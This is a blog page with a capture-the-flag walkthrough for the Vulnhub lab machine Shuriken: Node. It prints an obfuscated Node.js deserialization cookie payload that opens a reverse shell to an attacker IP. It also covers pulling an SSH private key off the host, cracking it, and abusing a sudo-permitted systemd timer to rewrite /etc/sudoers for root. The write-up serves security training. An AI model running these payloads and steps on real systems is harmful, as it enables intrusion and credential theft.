<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
<meta name=author content="Kiel Vaughn">
<meta name=description content="Shuriken: Node    Shuriken:Node is a recently released box on Vulnhub by TheCyb3rW0lf. It is rated as an easy/medium difficulty box. Below are some hints if you get stuck and a full walkthrough for this box.
Click on the title to expand each section below.
Hints    Initial Foothold Hints  What technologies are being utilized on the main website? Are there any vulnerabilities for this technology?">
<meta name=keywords content="blog,cybersecurity,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Shuriken: Node">
<meta name=twitter:description content="Shuriken: Node    Shuriken:Node is a recently released box on Vulnhub by TheCyb3rW0lf. It is rated as an easy/medium difficulty box. Below are some hints if you get stuck and a full walkthrough for this box.
Click on the title to expand each section below.
Hints    Initial Foothold Hints  What technologies are being utilized on the main website? Are there any vulnerabilities for this technology?">
<meta property="og:title" content="Shuriken: Node">
<meta property="og:description" content="Shuriken: Node    Shuriken:Node is a recently released box on Vulnhub by TheCyb3rW0lf. It is rated as an easy/medium difficulty box. Below are some hints if you get stuck and a full walkthrough for this box.
Click on the title to expand each section below.
Hints    Initial Foothold Hints  What technologies are being utilized on the main website? Are there any vulnerabilities for this technology?">
<meta property="og:type" content="article">
<meta property="og:url" content="https://www.kielvaughn.com/ctfs/2021-03-07-shuriken-node/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2021-03-07T00:00:00+00:00">
<meta property="article:modified_time" content="2021-03-07T00:00:00+00:00">
<title>
Shuriken: Node · Kiel Vaughn, CISSP
</title>
<link rel=canonical href=https://www.kielvaughn.com/ctfs/2021-03-07-shuriken-node/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
<link rel=apple-touch-icon href=/assets/img/cissp.ico>
<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
<meta name=generator content="Hugo 0.90.1">
</head>
<body class="preload-transitions colorscheme-dark">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Kiel Vaughn, CISSP
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/whoami/>whoami</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/certifications/>certifications</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=https://www.kielvaughn.com/ctfs/2021-03-07-shuriken-node/>
Shuriken: Node
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-03-07T00:00:00Z>
March 7, 2021
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
6-minute read
</span>
</div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/privilege-escalation/>privilege escalation</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/node.js-deserialization/>Node.js deserialization</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/linux-service-abuse/>Linux service abuse</a>
</span></div>
</div>
</header>
<div>
<h1 id=shuriken-node>
Shuriken: Node
<a class=heading-link href=#shuriken-node>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>Shuriken:Node is a recently released box on <a href=https://www.vulnhub.com/entry/shuriken-node,628/>Vulnhub</a> by TheCyb3rW0lf. It is rated as an easy/medium difficulty box. Below are some hints if you get stuck and a full walkthrough for this box.</p>
<p>Click on the title to expand each section below.</p>
<h2 id=hints>
Hints
<a class=heading-link href=#hints>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<details><summary><strong>Initial Foothold Hints</strong></summary>
<ul>
<li>What technologies are being utilized on the main website?
<li>Are there any vulnerabilities for this technology?
</ul>
</details>
<details><summary><strong>Lateral Movement Hints</strong></summary>
<ul>
<li>Enumeration is very beneficial.
<li>What other port was open besides the website's port?
<li>What would you need to be able to connect with this service without a password?
</ul>
</details>
<details><summary><strong>Root Privilege Escalation Hints</strong></summary>
<ul>
<li>What can the 2nd user run as sudo?
<li>Is there a way this could be abused?
</ul>
</details>
<h2 id=walkthrough>
Walkthrough
<a class=heading-link href=#walkthrough>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<details><summary><strong>Full Walkthrough</strong></summary>
First, once imported, I run the following to discover the IP address of the system:
<p><strong><code>netdiscover -i eth0</code></strong></p>
<p><img src=/assets/img/Shuriken1.png alt="Shuriken - netdiscover"></p>
<p>Next, I use:</p>
<p><strong><code>threader3000</code></strong></p>
<p>and input the system&rsquo;s IP address when prompted to uncover which ports are open on the system. Once completed, I let it run it&rsquo;s suggested nmap scan as well.</p>
<p><img src=/assets/img/Shuriken2.png alt="Shuriken - threader3000"></p>
<p>It appears that both SSH and a website are open. Let&rsquo;s visit the website on port 8080 by navigating to <strong>http://&lt;target IP>:8080</strong> in our browser.</p>
<p>It appears that this company was recently the victim of a data breach.</p>
<p><img src=/assets/img/Shuriken3.png alt="Shuriken - website1"></p>
<p>Scrolling further down there is a mention of a Node.js vulnerability. Node.js is being utilized as shown in the above nmap scan. Let&rsquo;s see if they are utilizing a vulnerable version.</p>
<p><img src=/assets/img/Shuriken4.png alt="Shuriken - website2"></p>
<p>Digging into this further, I uncovered that there was a cookie with a URL encoded value stored for my session:</p>
<p><img src=/assets/img/Shuriken5.png alt="Shuriken - cookie"></p>
<p>I used <a href=https://gchq.github.io/CyberChef/>CyberChef</a> to URL Decode this value. This appeared to return a base64 encoded string. I then decoded this value as base64, which returned the following:</p>
<p><img src=/assets/img/Shuriken6.png alt="Shuriken - decode cookie"></p>
<p>Let&rsquo;s see if we can modify these cookie values and see if we&rsquo;re able to login as an administrator. I tested by changing the &ldquo;username&rdquo; value to admin and &ldquo;isGuest&rdquo; to false. I then reencoded the string as base64/URL encoding.</p>
<p><img src=/assets/img/Shuriken7.png alt="Shuriken reencode cookie"></p>
<p>Let&rsquo;s reload the page and see what happens.</p>
<p><img src=/assets/img/Shuriken8.png alt="Shuriken revisit webpage"></p>
<p>It appears that this updated the username to &ldquo;admin&rdquo;, but we still need to login. Let&rsquo;s try a deserialization attack and insert a reverse shell into the cookie. Luckily, a sample script is available <a href=https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py>here</a>. Let&rsquo;s run it as follows:</p>
<p><strong><code>python nodejsshell.py &lt;attacker ip> &lt;attacker port></code></strong></p>
<p><img src=/assets/img/Shuriken9.png alt="Shuriken nodejsshell.py"></p>
<p>There&rsquo;s some additional steps that need to occur in order to properly get this to work. The following <a href=https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>site</a> provides a good example of what the values need to be set to. Essentially, the cookie needs to be replaced with something similar to the following:</p>
<p><strong><code>{"rce":"_$$ND_FUNC$$_function (){&lt;insert code from nodejsshell.py>}()"}</code></strong></p>
<p>In this particular example, the code looks like the following:</p>
<p><strong><code>{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32, 114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32, 114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112, 97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,49,46,49,57,50,34,59,10,80,79,82,84,61,34, 52,53,54,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101, 111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110, 115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46, 112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105, 111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79, 102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72, 79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101, 119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111, 110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123, 10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47, 115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40, 34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110, 116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46, 115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32, 115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32, 32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111, 100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46, 101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32, 32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101, 114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32, 115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85, 84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}</code></strong></p>
<p>Let&rsquo;s reencode this to base64 and then URL encoding with CyberChef. Place the output of the script above in the &ldquo;username&rdquo; field.</p>
<p><img src=/assets/img/Shuriken10.png alt="Shuriken modify cookie"></p>
<p>Next, before we update the cookie value, let&rsquo;s create a netcat listener on our attacker pc. This can be done with:</p>
<p><strong><code>nc -nvlp &lt;port></code></strong></p>
<p>where the port used is the one utilized in the nodejsshell.py script above.</p>
<p><img src=/assets/img/Shuriken11.png alt="Shuriken nc listener"></p>
<p>Next, modify this cookie value (in developer tools) and reload the webpage.</p>
<p><img src=/assets/img/Shuriken13.png alt="Shuriken modify cookie value"></p>
<p>If you look at your terminal window with netcat running, you should have an initial foothold on this system!</p>
<p><img src=/assets/img/Shuriken14.png alt="Shuriken initial foothold"></p>
<p>Let&rsquo;s see how we can upgrade our shell. First, let&rsquo;s run:</p>
<p><strong><code>which python</code></strong></p>
<p>This returns a result, <strong>/usr/bin/python</strong> which lets us know that python is locally installed. Let&rsquo;s run</p>
<p><strong><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></strong> to upgrade our shell.</p>
<p><img src=/assets/img/Shuriken15.png alt="Shuriken upgrade shell"></p>
<p>Next, let&rsquo;s get linpeas onto this server by hosting it on our attacker host. This can be done by running the following command in another terminal window:</p>
<p><strong><code>python3 -m http.server 8080</code></strong></p>
<p><img src=/assets/img/Shuriken16.png alt="Shuriken python3 http.server"></p>
<p>Next, on the victim host, run the following commands to download the linpeas.sh script and make it executable:</p>
<p><strong><code>cd /tmp</code></strong></p>
<p><strong><code>wget http://&lt;attacker ip>:8080/linpeas.sh</code></strong></p>
<p><strong><code>chmod +x ./linpeas.sh</code></strong></p>
<p><img src=/assets/img/Shuriken17.png alt="Shuriken linpeas download"></p>
<p>Next, run:</p>
<p><strong><code>./linpeas.sh</code></strong></p>
<p>and review the output for privilege escalation methods. It appears that there is a backup of some SSH keys in the /var/backups directory as shown below:</p>
<p><img src=/assets/img/Shuriken18.png alt="Shuriken ssh-key.zip"></p>
<p>Let&rsquo;s navigate to this directory with:</p>
<p><strong><code>cd /var/backups</code></strong></p>
<p>and run</p>
<p><strong><code>ls -al</code></strong> to view permissions on this file:</p>
<p><img src=/assets/img/Shuriken19.png alt="Shuriken ssh-backup.zip permissions"></p>
<p>It appears we have read only access to this file. Let&rsquo;s copy it to our current user&rsquo;s home directory with:</p>
<p><strong><code>cp ssh-backup.zip ~/</code></strong></p>
<p><img src=/assets/img/Shuriken20.png alt="Shuriken copy ssh-backup.zip file"></p>
<p>Next, let&rsquo;s navigate to our user&rsquo;s home directory with:</p>
<p><strong><code>cd ~</code></strong></p>
<p>and then run:</p>
<p><strong><code>unzip ssh-backup.zip</code></strong></p>
<p>This will inflate the id_rsa file, which is a private key for what is presumed to be the serv-adm user.</p>
<p><img src=/assets/img/Shuriken21.png alt="Shuriken inflate ssh-backup file"></p>
<p>We need to extract the public key, so in order to do so, we need to copy this file over to our attacker host. We know that python is installed so let&rsquo;s start a server with:</p>
<p><strong><code>python -m SimpleHTTPServer 9000</code></strong></p>
<p><img src=/assets/img/Shuriken22.png alt="Shuriken python SimpleHTTPServer"></p>
<p>On our attacker host, let&rsquo;s run the following command:</p>
<p><strong><code>wget http://&lt;victim ip>:9000/id_rsa</code></strong></p>
<p><img src=/assets/img/Shuriken23.png alt="Shuriken save id_rsa"></p>
<p>Next, let&rsquo;s change the permissions on this file to 600 with:</p>
<p><strong><code>chmod 600 id_rsa</code></strong></p>
<p>Next, let&rsquo;s convert this to a format that can be cracked with john with:</p>
<p><strong><code>/usr/share/john/ssh2john.py id_rsa crackme</code></strong></p>
<p><img src=/assets/img/Shuriken24.png alt="Shuriken ssh2john"></p>
<p>Next, let&rsquo;s run john with the following:</p>
<p><strong><code>john crackme --wordlist=/usr/share/wordlists/rockyou.txt</code></strong></p>
<p>This will return a password relatively quickly:</p>
<p><img src=/assets/img/Shuriken25.png alt="Shuriken john ssh password"></p>
<p>Now, let&rsquo;s SSH in and attempt to do it as the serv-adm user with:</p>
<p><strong><code>ssh -i id_rsa serv-adm@&lt;victim ip></code></strong></p>
<p>When prompted for the password, enter the one that was cracked by john.</p>
<p><img src=/assets/img/Shuriken27.png alt="Shuriken serv-adm access"></p>
<p>Awesome, we now have access as the serv-adm user. Let&rsquo;s see if they have access to any root level permissions with:</p>
<p><strong><code>sudo -l</code></strong></p>
<p><img src=/assets/img/Shuriken28.png alt="Shuriken serv-adm sudo -l"></p>
<p>It looks like we have access to start/stop a service named shuriken-auto.timer. Let&rsquo;s run:</p>
<p><strong><code>locate shuriken-auto.timer</code></strong></p>
<p>to find the folder this service is saved in</p>
<p><img src=/assets/img/Shuriken29.png alt="Shuriken locate shuriken-auto.timer"></p>
<p>Let&rsquo;s navigate to this folder with:</p>
<p><strong><code>cd /etc/systemd/system/</code></strong></p>
<p>and run:</p>
<p><strong><code>ls -al|grep shuriken</code></strong></p>
<p><img src=/assets/img/Shuriken30.png alt="Shuriken view shuriken-auto.timer permissions"></p>
<p>It appears we have the ability to modify this job and timer! Let&rsquo;s delete what&rsquo;s in there and modify the timer settings to:</p>
<p><strong><code>OnCalendar=*:0/1</code></strong></p>
<p><img src=/assets/img/Shuriken31.png alt="Shuriken edit timer"></p>
<p>Next, let&rsquo;s run:</p>
<p><strong><code>nano shuriken-job.service</code></strong></p>
<p>and change the [Service] section to what is shown in the screenshot below:</p>
<p><img src=/assets/img/Shuriken32.png alt="Shuriken edit service"></p>
<p>Once saved, navigate to the tmp directory with:</p>
<p><strong><code>/cd/tmp</code></strong></p>
<p>followed by:</p>
<p><strong><code>nano test.sh</code></strong></p>
<p>and enter the following:</p>
<p><strong><code>#!/bin/bash</code></strong></p>
<p><strong><code>chmod 777 /etc/sudoers</code></strong></p>
<p><img src=/assets/img/Shuriken33.png alt="Shuriken modify sudoers"></p>
<p>Next, let&rsquo;s make this script executable with:</p>
<p><strong><code>chmod +x test.sh</code></strong></p>
<p><img src=/assets/img/Shuriken34.png alt="Shuriken chmod +x test.sh"></p>
<p>Let&rsquo;s stop/start and reload the daemon by running the following:</p>
<p><strong><code>sudo /bin/systemctl stop shuriken-auto.timer</code></strong></p>
<p><strong><code>sudo /bin/systemctl start shuriken-auto.timer</code></strong></p>
<p><strong><code>sudo /bin/systemctl daemon-reload</code></strong></p>
<p>After a minute, the /etc/sudoers file should be world writeable:</p>
<p><img src=/assets/img/Shuriken35.png alt="Shuriken sudoers permission change"></p>
<p>Let&rsquo;s run:</p>
<p><strong><code>nano /etc/sudoers</code></strong></p>
<p>and modify it so the serv-adm user can run bash as root by adding in the following:</p>
<p><strong><code>serv-adm ALL=(ALL)NOPASSWD: /bin/bash</code></strong></p>
<p><img src=/assets/img/Shuriken36.png alt="Shuriken modify /etc/sudoers"></p>
<p>Save and exit this file.</p>
<p>Next, we need to modify the permissions on /etc/sudoers back to 440 or else it will not work properly. Let&rsquo;s run <strong>nano test.sh</strong> and change the permissions to 440 in this script.</p>
<p><img src=/assets/img/Shuriken37.png alt="Shuriken revert /etc/sudoers permissions"></p>
<p>After a minute, the permissions should revert back to the appropriate level.</p>
<p><img src=/assets/img/Shuriken38.png alt="Shuriken sudoers file permissions reverted"></p>
<p>Now, let&rsquo;s run:</p>
<p><strong><code>sudo /bin/bash</code></strong></p>
<p>which should give you root access. Follow this up with:</p>
<p><strong><code>cd /root</code></strong></p>
<p>and</p>
<p><strong><code>cat root.txt</code></strong></p>
<p>to finish this box!</p>
<p><img src=/assets/img/Shuriken39.png alt="Shuriken rooted"></p>
</details>
</div>
<footer>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
©
2020 -
2021
Kiel Vaughn
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
</body>
</html>